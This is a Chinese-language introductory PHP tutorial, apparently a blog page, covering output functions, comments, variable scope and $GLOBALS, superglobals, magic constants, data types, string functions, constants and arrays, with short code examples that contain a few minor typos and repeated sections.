<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span>:</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：hello world!abc</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>:</span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;&lt;h2&gt;PHP is fun!&lt;/h2&gt;&quot;</span>;</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;Hello world!&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;I&#x27;m about to learn PHP!&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">print_r()：</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$age</span>=array(18,20,24);</span><br><span class="line">    print_r(<span class="variable">$age</span>);</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：Array ( [0] =&gt; 18 [1] =&gt; 20 [2] =&gt; 24 )</span><br><span class="line"></span><br><span class="line">var_dump():</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$age</span>=array(18,20,24);</span><br><span class="line">    var_dump(<span class="variable">$age</span>);</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：array(3) &#123; [0]=&gt; int(18) [1]=&gt; int(20) [2]=&gt; int(24) &#125;</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**注意事项：**</font> 
php的代码部份全部要用半角的英文、很多人容易写成全角的英文和符号造成PHP代码报错。
PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。
PHP代码的最后一行可以加也可不加分号。由于很多学习者特别是初学者经常犯一个毛病：写完一行代码不加
分号。因此，容易报错。我们通常在公司里面规定：一行代码写完，就必须要加分号。
</font></td></tr></table>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3.PHP中的注释：</strong></font><br><font color="#00B2EE"><strong>单行注释（只注释一行）：</strong></font> <font color="#FF7F00">&#x2F;&#x2F;</font> 双斜杠表示单行注释,有时也用 # 表示,但用的比较少，多用 <font color="#FF7F00">&#x2F;&#x2F;</font><br><font color="#00B2EE"><strong>多行注释（注释多行）：</strong></font> 以 <font color="#FF7F00">&#x2F;* </font> 开始, 以<font color="#FF7F00">*&#x2F;</font>结束代表多行注释。<br></font> </p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-PHP-变量"><a href="#1-2-PHP-变量" class="headerlink" title="1.2 PHP 变量"></a><font color="#3CB371" face="Comic sans MS">1.2 PHP 变量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP中的变量有几个特点：</strong></font></p>
<ol>
<li>必须要以<font color="#FF7F00">$</font>开始。如变量x必须要写成<font color="#FF7F00">$x</font></li>
<li>变量的首字母不能以数字开始</li>
<li>变量的名字区分大小写</li>
<li>变量不要用特殊符号、中文，_不算特殊符号</li>
<li>变量命名要有意义（别写xxx，aaa，ccc这种 变量名）</li>
<li>$ 叫作美元符，英文单词：dollar。PHP的变量必须以美元符开始。说明搞PHP有“钱”图</font></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">变量在您第一次赋值给它的时候被创建：在下面的语句执行中，变量txt将保</span><br><span class="line">存值Hello world!，且变量 x 将保存值 5。</span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$txt</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"> <span class="variable">$x</span>=5;</span><br><span class="line"> <span class="variable">$y</span>=10.5;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. PHP是一门弱类型语言：</strong></font><br>在上面的实例中，我们注意到，不必向 PHP 声明该变量的数据类型。<br>PHP 会根据变量的值，自动把变量转换为正确的数据类型。<br>在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP变量的作用域：</strong></font><font color="#00B2EE"><strong>local、global、static、parameter</strong></font><br><font color="#00B2EE"><strong>局部和全局作用域（loacal  global）：</strong></font>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p>
<p><font color="#00B2EE"><strong>PHP global 关键字：</strong></font>global 关键字用于函数内访问全局变量。<br>PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$x</span>=10;</span><br><span class="line"> <span class="variable">$y</span>=20;</span><br><span class="line"> <span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">     global <span class="variable">$x</span>,<span class="variable">$y</span>;      //使用global关键字</span><br><span class="line"> </span><br><span class="line">     <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">test</span>();</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$y</span>;//输出30</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">上面例子也可以写成：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$x</span>=5;</span><br><span class="line"> <span class="variable">$y</span>=10;</span><br><span class="line"> <span class="keyword">function</span> myTest()</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>]=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]+<span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> myTest();</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$y</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong><br>不可在global 后写 $变量 &#x3D; 值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$a</span> , <span class="variable">$b</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果是不是显示出来了？</span></span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>1.通过$GLOBLAS来读取外部变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$one</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable">$two</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$result</span> = <span class="variable">$two</span> + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;one&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//你会发现结果变成了110</span></span><br><span class="line"><span class="keyword">echo</span> demo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中：我们将函数体外的变量通过$GLOBALS拿到了函数体使用。所以，打破了函数外的变量不能在函数体内使用的限定。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>static 作用域：</strong></font>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。要做到这一点，请在您第一次声明变量时使用 static 关键字：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="built_in">static</span> <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">     <span class="variable">$x</span>++;</span><br><span class="line"> &#125;</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> myTest();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>2.通过$GLOBLAS，在函数内修改外部变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$hongniu</span> = <span class="string">&#x27;我是一个兵，来自老百姓&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;执行了函数test哟&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   //调用<span class="built_in">test</span>()函数，将通过<span class="variable">$GLOBALS</span>[<span class="string">&#x27;hongniu&#x27;</span>],把<span class="variable">$hongniu</span>的值改变掉</span><br><span class="line"></span><br><span class="line">   <span class="variable">$GLOBALS</span>[<span class="string">&#x27;hongniu&#x27;</span>] = <span class="string">&#x27;帮助别人很快乐&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">//发现是不是输出的值变了呀？</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$hongniu</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过上例：我们发现通过$GLOBALS[‘hongniu’],把$hongniu的值改变掉，所以在最后输出$hongniu的时候，值发生了变化。</p>
</blockquote>
<p>&amp;emsp;<br>3.通过$GLOBLAS，在函数内创建全局变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$GLOBALS</span>[<span class="string">&#x27;que&#x27;</span>] = <span class="string">&#x27;提神喝茶更好哟&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;你调了一下函数hello&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hello();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$que</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上例中，我们发现$que是不存在的，可以调用函数hello()后，在函数外部可以执行echo $que了，能够看到结果：提神喝茶更好。我们明白了，函数内声明的变量，通过$GLOBALS声明一个变量，也能够显示出来。</p>
</blockquote>
<p>&amp;emsp;<br>下面的知识是【了解】级别，我们越来越少的使用这种方式来声明全局变量了。在函数内使用global关键词后面跟一个或多个变量，就把变量变为了全局变量，格式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$a</span> , <span class="variable">$b</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果是不是显示出来了？</span></span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</p>
<p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p>
<p><a href="http://www.php.cn/code/159.html">使用方法参见</a></p>
<table>
<thead>
<tr>
<th align="center">常量符号</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__LINE__</td>
<td>文件中的当前行号</td>
</tr>
<tr>
<td align="center">__FILE__</td>
<td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td>
</tr>
<tr>
<td align="center">__DIR__</td>
<td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td>
</tr>
<tr>
<td align="center">__FUNCTION__</td>
<td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td>
</tr>
<tr>
<td align="center">__CLASS__</td>
<td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td>
</tr>
<tr>
<td align="center">__TRAIT__</td>
<td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td>
</tr>
<tr>
<td align="center">__METHOD__</td>
<td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-PHP-数据类型"><a href="#1-3-PHP-数据类型" class="headerlink" title="1.3 PHP 数据类型"></a><font color="#3CB371" face="Comic sans MS">1.3 PHP 数据类型</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP的数据类型包括以下几种：</strong></font><br><strong>Integer（整型）、String（字符串）、Float（浮点型）、Boolean（布尔型）、Array（数组）、Object（对象）、NULL（空值）</strong></p>
<p><font color="red"><strong>2. 查看变量数据类型：</strong></font><br><font color="#00B2EE"><strong>1. gettype(传入一个变量)</strong></font> 能够获得变量的类型<br><font color="#00B2EE"><strong>2. var_dump(传入一个变量)</strong></font>  输出变类型和值 （最常用）<br>var_dump()是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-PHP-字符串"><a href="#1-4-PHP-字符串" class="headerlink" title="1.4 PHP 字符串"></a><font color="#3CB371" face="Comic sans MS">1.4 PHP 字符串</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 字符串型可以用三种方法定义：</strong></font><strong>单引号形式</strong>、<strong>双引号形式</strong>和<strong>Heredoc结构</strong>形式。</p>
<p><font color="red"><strong>2.单、双引号嵌套使用时注意事项：</strong></font><br>1.若单引号嵌套单引号或者双引号嵌套双号时：里层(被嵌套)的引号要用“<font color="#FF7F00">&lt;&#x2F;font&gt;”转义字符转义；<br>2.单引号嵌套双引号或者双引号嵌套单引号时：不需要用转义字符。</p>
<p><font color="red"><strong>3.当美元符<font color="#FF7F00">$</font>在引号里时的区别：</strong></font><br>1.在双引号里：当双引号里包含变量时，变量会双引号里的内容连在一起；<br>2.在单引号里：变量会被当做字符地输出，即“<font color="#FF7F00"><strong>$</strong></font>”会被输出。<br></font></p>
<p><img data-src="https://i.loli.net/2019/02/13/5c6438a104ab9.png" alt="1"></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red">**4. Heredoc结构(&lt;&lt;&lt;)：**</font><br>2).然后在&lt;&lt;&lt;后面写上字符（建议英文大写字符）。如下例中的：ABC<br>3).然后换行写上任意想写的字符<br>4).写完后，顶行。在行最开始处，再写上&lt;&lt;&lt;后面的字符和分号。如下例中的：ABC;<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$dingjie</span> = &lt;&lt;&lt;<span class="string">ABC     //“=”和“&lt;&lt;&lt;”和“ABC</span>”这三个标志符号</span><br><span class="line">这里是字符串的内容。</span><br><span class="line">ABC;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP strlen()  函数：</strong></font><br>有时知道字符串值的长度是很有用的。<br><font color="#00B2EE"><strong>strlen()</strong></font> 函数返回字符串的长度（字符数）。<br><strong>注意：</strong>在UTF-8下 strlen  把<font color="#00B2EE"><strong>中文字符算成 3 个字节，英文，空格，符号占 1 个字节。</strong></font><br>&amp;emsp;<br><font color="red"><strong>6. PHP strpos() 函数：</strong></font><br><font color="#00B2EE"><strong>strpos()</strong></font>函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>实例:下面的实例在字符串 “Hello world!” 中查找文本 “world”：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="built_in">echo</span> strpos(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"> ?&gt;</span><br><span class="line">运行结果：6</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p><font color="red"><strong>提示：</strong>在上面的实例中，字符串 “world” 的位置是 6。之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</font></p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-PHP-常量"><a href="#1-5-PHP-常量" class="headerlink" title="1.5 PHP 常量"></a><font color="#3CB371" face="Comic sans MS">1.5 PHP 常量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 自定义常量：</strong></font><br>(1) 常量是单个值的标识符（名称）。在脚本中无法改变该值。<br>(2) 有效的常量名以字符或下划线开头（常量名称前面没有 $ 符号）。<br>(3) 常量名可以小写，但是通常大写。<br>(4) 常量是全局的，常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</p>
<p><font color="red">定义方法：</font><br>如需设置常量，请使用 define() 函数 - 它使用三个参数：</p>
<ol>
<li>首个参数定义常量的名称</li>
<li>第二个参数定义常量的值</li>
<li>可选的第三个参数规定常量名是否对大小写敏感。默认是 false。</li>
</ol>
<p><font color="red"><strong>注意关于define和const定义的区别：</strong></font><br>可以用 define() 函数来定义常量。在 PHP 5.3.0 以后，可以使用 <font color="#00B2EE"><strong>const</strong></font>  关键字在类定义的外部定义常量，先前版本const 关键字只能在类（class）中使用。一个常量一旦被定义，就不能再改变或者取消定义。<br>常量只能包含标量数据（boolean，integer，float 和 string）。 可以定义 resource 常量，但应尽量避免，因为会造成不可预料的结果。<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define定义方式：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;PII&quot;</span>;</span><br><span class="line">define(<span class="string">&quot;PI&quot;</span>,<span class="number">3.14</span>);define(<span class="variable">$p</span>,<span class="number">3.14</span>);</span><br><span class="line">define(<span class="variable">$p</span>,<span class="number">3.14</span>);</span><br><span class="line"><span class="keyword">echo</span> PI;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PII;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="number">3.14</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const定义方式：</span><br><span class="line">希望一个成员变量不被修改 例如圆周率 3.1415926</span><br><span class="line">定义：const 常量名=值; 没有$符</span><br><span class="line">访问：类名 ::常量名 或 接口名::常量名</span><br><span class="line"></span><br><span class="line">&lt;?php　　　　　　　　　　　　　　　　　　　　　　defined(<span class="string">&#x27;TEXT&#x27;</span>);检查一个名称的常量是否存在</span><br><span class="line"> class A&#123;</span><br><span class="line"> const TAX_RATE=0.08;</span><br><span class="line"> public <span class="keyword">function</span> payTax(<span class="variable">$var</span>)&#123;</span><br><span class="line"> <span class="built_in">return</span> <span class="variable">$var</span>*A::TAX_RATE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new A();</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>-&gt;payTax(200):</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>用法一：</strong></font>const用于类成员变量，一经定义不可修改，define用于全局常量，不可用于类成员变量的定义，const可在类中使用，define不能。<br><font color="#00B2EE"><strong>用法二：</strong></font>const定义的常量大小写敏感，而define可通过第三个参数(为TRUE表示大小写不敏感)来指定大小写是否敏感。在运行时定义一个常量。define(‘TXE’,100,TRUE);<br><font color="#00B2EE"><strong>用法三：</strong></font>const不能在条件语句中定义常量，而define函数可以。if($a&gt;10){define(‘LE’,’hello’);<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 判定常量是否被定义：</strong></font><br>如果常量被重复定义以后，PHP解析器会发出“Constant XXX already defined”的警告，提醒我们该常量已经被定义过。那么，在团队开发，或代码量很大的情况下，我们如何去判定一个常量是否被定义呢？<br><font color="#00B2EE"><strong>defined()</strong></font>函数可以帮助我们判断一个常量是否已经定义，其语法格式为：<br><font color="red">bool defined(string constants_name)</font><br>它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">define(<span class="string">&quot;PI1&quot;</span>,3.14);</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;PI1&quot;</span>;</span><br><span class="line"><span class="variable">$is1</span> = defined(<span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$is2</span> = defined(<span class="string">&quot;PI2&quot;</span>);</span><br><span class="line">var_dump(<span class="variable">$is1</span>);</span><br><span class="line">var_dump(<span class="variable">$is2</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</p>
<p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p>
<p><a href="http://www.php.cn/code/159.html">使用方法参见</a></p>
<table>
<thead>
<tr>
<th align="center">常量符号</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__LINE__</td>
<td>文件中的当前行号</td>
</tr>
<tr>
<td align="center">__FILE__</td>
<td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td>
</tr>
<tr>
<td align="center">__DIR__</td>
<td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td>
</tr>
<tr>
<td align="center">__FUNCTION__</td>
<td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td>
</tr>
<tr>
<td align="center">__CLASS__</td>
<td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td>
</tr>
<tr>
<td align="center">__TRAIT__</td>
<td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td>
</tr>
<tr>
<td align="center">__METHOD__</td>
<td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-PHP数组：索引数组、关联数组"><a href="#1-6-PHP数组：索引数组、关联数组" class="headerlink" title="1.6 PHP数组：索引数组、关联数组"></a><font color="#3CB371" face="Comic sans MS">1.6 PHP数组：索引数组、关联数组</font></h4><p><font face="Comic sans MS">数组可以存入多个不同类型的数据，是一个复合数据类型。<br>我们可以使用<font color="red"><strong>array()</strong></font> 来初始化数组，每个数组元素之间使用逗号分隔  ,在PHP5.4版本之后，数组的初始化更为简洁，用中括号<font color="red"><strong>[ ]</strong></font> 来初始化。<br>数组的格式：$shuzu&#x3D;array(key&#x3D;&gt;value)<br>key：键值  &amp;emsp; value：键值对应值</p>
<p><font color="red"><strong>1. 索引数组：键值为整形（int）</strong></font><br><strong>我们来总结规律：</strong><br><font color="#00B2EE"><strong>1.</strong></font>索引数组若不强制声明他的下标，他的下标是从0开始的。（我们的第一个数组的值：只有不断努力才能博得未来。这个值的下标为0）。<br><font color="#00B2EE"><strong>2.</strong></font>如果我指定过下标他的下标就为我指定的值。如下标为5,10和下标为19的，都是我指定过的值。<br><font color="#00B2EE"><strong>3.</strong></font>若某个值（如php.cn），强制指定了下标（下标为10）。在它后面加上的值（PHP学院），不指定下标的话。他们的下标增长规律为最大值+1。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    //设置编码</span><br><span class="line"> <span class="variable">$array</span>=array(100,1.34,<span class="literal">true</span>,<span class="string">&quot;PHP中文网&quot;</span>,);</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> var_dump(<span class="variable">$array</span>);</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;pre/&gt;&#x27;</span>;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 关联数组：键值中只要有一个为字符串（String）类型即称为关联数组）</strong></font><br>那我们来声明一下关联数组。跟索引数组的声明方式完成一样。不过不同的是，必须要指定字符串的下标和必须要使用键值对应符。<br>我们通过实验知道：<br><font color="#00B2EE"><strong>1.</strong></font>声明关联数组是 键名 &#x3D;&gt; 值。<br><font color="#00B2EE"><strong>2.</strong></font>在关联数组可以有索引数组的元素。<br></font> </p>
